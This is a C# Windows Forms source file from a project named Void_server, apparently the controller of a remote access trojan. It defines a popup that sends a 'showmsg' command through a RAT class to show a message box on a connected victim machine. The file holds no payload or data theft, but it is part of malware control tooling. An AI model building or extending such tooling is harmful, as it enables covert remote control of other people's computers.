using System;
using System.Windows.Forms;
using Void_server.Libs;

namespace Void_server.Popups
{
    public partial class ShowMsg : Form
    {
        public ShowMsg()
        {
            InitializeComponent();
        }

        private void send_Click(object sender, EventArgs e)
        {
            RAT.Send($"showmsg|{titleBox.Text}|{msgBox.Text}|{iconBox.SelectedItem.ToString()}");
            this.Close();
        }

        private void topBar_MouseDown(object sender, MouseEventArgs e)
        {
            Snake.Controls.Drag(e, this);
        }

        private void close_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
